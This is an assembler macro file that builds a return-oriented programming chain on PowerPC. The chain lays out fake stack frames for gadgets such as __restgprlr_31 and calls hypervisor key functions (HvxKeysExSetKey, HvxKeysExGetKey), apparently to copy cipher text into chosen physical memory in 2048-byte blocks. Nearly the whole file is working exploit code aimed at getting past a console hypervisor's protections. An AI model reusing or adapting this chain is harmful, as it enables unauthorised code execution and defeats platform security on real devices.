

# Notes:
#   - All macros have a common pro/epilogue where the caller must transition in/out using the
#       __restgprlr_31 gadget.


###########################################################
# void MEMCPY_CIPHER_TEXT_BLOCK()
#
#   TODO
#
###########################################################
.macro MEMCPY_CIPHER_TEXT_BLOCK dstAddrPhys, srcAddrPhys, size

        ###########################################################
        # Gadget N: prologue
        #
        #   addi    r1, r1, 0x60
        #   lwz     r12, -0x8(r1)
        #   mtlr    r12
        #   ld      r31, -0x10(r1)
        #   blr
        ###########################################################
        .fill   0x50, 1, 0x00
        .long   0x00000000, \size       # r31
        .long   mr_r31_to_r3            # lr
        .long   0x00000000
        
        ###########################################################
        # Gadget N: load r3 with block size
        #
        #   mr      r3, r31
        #   addi    r1, r1, 0x70
        #   lwz     r12, -8(r1)
        #   mtlr    r12
        #   ld      r31, -0x10(r1)
        #   blr
        ###########################################################
        .fill   0x60, 1, 0x00
        .long   0x00000000, pPayloadCipherTextSizeValue - 4     # r31 - pointer to address to store block size at
        .long   stw_r3_onto_pointer                             # lr
        .long   0x00000000
        
        ###########################################################
        # Gadget N: store block size into pPayloadCipherTextSizeValue
        #
        #   lwz     r11, 4(r31)
        #   stw     r3, 0(r11)
        #   li      r3, 0
        #   addi    r1, r1, 0x60
        #   lwz     r12, -8(r1)
        #   mtlr    r12
        #   ld      r31, -0x10(r1)
        #   blr
        ###########################################################
        
        ###########################################################
        # Gadget N: get stack pointer for next gadget
        #
        #   Note: the epilogue is required here even though GET_STACK_PTR is immediately followed by another
        #       macro (and could be chained) as it accounts for the epilogue in the stack pointer calculation.
        ###########################################################
        GET_STACK_PTR arithmetic_scratch1
        .fill   0x50, 1, 0x00
        .long   0x31313131, 0x31313131      # r31
        .long   __restgprlr_31              # lr
        .long   0x00000000
        
    memcpy_cipher_text_block_base_addr = .
        
        ###########################################################
        # Gadget N: write srcAddrPhys into gadget data at L9 below
        #
        ###########################################################
        WRITE_PTR_TO_GADGET_DATA memcpy_cipher_text_scratch, arithmetic_scratch1, ((99f + cf_r4_offset) - memcpy_cipher_text_block_base_addr), \srcAddrPhys
        
        ###########################################################
        # Gadget N: call HvxKeysExSetKey
        #
        #   r3 = key id
        #   r4 = source physical address (to be updated by previous gadgets)
        #   r5 = block size
        ###########################################################
        CALL_FUNC 99, HvxKeysExSetKey, R3H=0, R3L=0x00000102, R4H=0, R4L=0x41414141, R5H=0, R5L=\size
        
        ###########################################################
        # Gadget N: write PayloadCipherTextSizeValuePhysAddr into gadget data at L9 below
        #
        ###########################################################
        WRITE_PTR_TO_GADGET_DATA memcpy_cipher_text_scratch, arithmetic_scratch1, ((99f + cf_r5_offset) - memcpy_cipher_text_block_base_addr), PayloadCipherTextSizeValuePhysAddr
        
        ###########################################################
        # Gadget N: write dstAddrPhys into gadget data at L8 below
        #
        ###########################################################
        WRITE_PTR_TO_GADGET_DATA memcpy_cipher_text_scratch, arithmetic_scratch1, ((99f + cf_r4_offset) - memcpy_cipher_text_block_base_addr), \dstAddrPhys
        
        ###########################################################
        # Gadget N: call HvxKeysExGetKey
        #
        #   r3 = key id
        #   r4 = destination physical address (to be updated by previous gadgets)
        #   r5 = physical address of block size value (to be updated by previous gadgets)
        ###########################################################
        CALL_FUNC 99, HvxKeysExGetKey, R3H=0, R3L=0x00000102, R4H=0, R4L=0x41414141, R5H=0, R5L=0x41414141
        
        ###########################################################
        # Gadget N: epilogue to be implemented by the caller
        #
        #   addi    r1, r1, 0x60
        #   lwz     r12, -0x8(r1)
        #   mtlr    r12
        #   ld      r31, -0x10(r1)
        #   blr
        ###########################################################

.endm

###########################################################
# void MEMCPY_CIPHER_TEXT()
#
#   TODO
#
###########################################################
.macro MEMCPY_CIPHER_TEXT dstAddrPhys, srcAddrPhys, size

    memcpy_cipher_text_base_addr = .

        ###########################################################
        # Gadget N: prologue
        #
        #   addi    r1, r1, 0x60
        #   lwz     r12, -0x8(r1)
        #   mtlr    r12
        #   ld      r31, -0x10(r1)
        #   blr
        ###########################################################
        .fill   0x50, 1, 0x00
        .long   0x31313131, 0x31313131      # r31
        .long   __restgprlr_31              # lr
        .long   0x00000000
        
        # Loop for number of 2048 blocks.
        .rept \size / 2048
        
            ###########################################################
            # Gadget N: copy next block of cipher text
            #
            ###########################################################
            MEMCPY_CIPHER_TEXT_BLOCK \dstAddrPhys, \srcAddrPhys, 2048
            
            ###########################################################
            # Gadget N: update source and dest addresses
            #
            ###########################################################
            LOAD_ADD_STORE \srcAddrPhys, 2048
            LOAD_ADD_STORE \dstAddrPhys, 2048
        
        .endr
        
        # Check for remainder size.
        .if \size % 2048
        
            _memcpy_remainder_size = \size % 2048
        
            ###########################################################
            # Gadget N: copy next block of cipher text
            #
            ###########################################################
            MEMCPY_CIPHER_TEXT_BLOCK \dstAddrPhys, \srcAddrPhys, _memcpy_remainder_size
            
            ###########################################################
            # Gadget N: update source and dest addresses
            #
            ###########################################################
            LOAD_ADD_STORE \srcAddrPhys, _memcpy_remainder_size
            LOAD_ADD_STORE \dstAddrPhys, _memcpy_remainder_size
        
        .endif
        
        ###########################################################
        # Gadget N: epilogue (not really needed but here for consistency)
        #
        #   addi    r1, r1, 0x60
        #   lwz     r12, -0x8(r1)
        #   mtlr    r12
        #   ld      r31, -0x10(r1)
        #   blr
        ###########################################################
        .fill   0x50, 1, 0x00
        .long   0x31313131, 0x31313131      # r31
        .long   __restgprlr_31              # lr
        .long   0x00000000

.endm

